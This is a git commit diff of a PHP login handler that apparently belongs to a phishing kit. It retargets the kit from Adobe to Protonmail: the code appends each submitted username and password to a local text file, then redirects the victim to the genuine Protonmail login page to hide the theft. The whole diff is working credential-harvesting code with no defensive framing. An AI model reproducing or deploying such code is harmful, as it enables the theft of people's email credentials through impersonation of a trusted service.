c64c27b65a2fbb932d98395e9b49754ef6383a3c
TaNviiR-RiiYaD <80155708+TaNviiR-RiiYaD@users.noreply.github.com>
2021-08-23 12:26:16 +0600

    Add files via upload

--- login.php
+++ login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Adobe Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://adobe.ly/2OE9ZKL');
+file_put_contents("usernames.txt", "Protonmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://beta.protonmail.com/login');
 exit();
 ?>
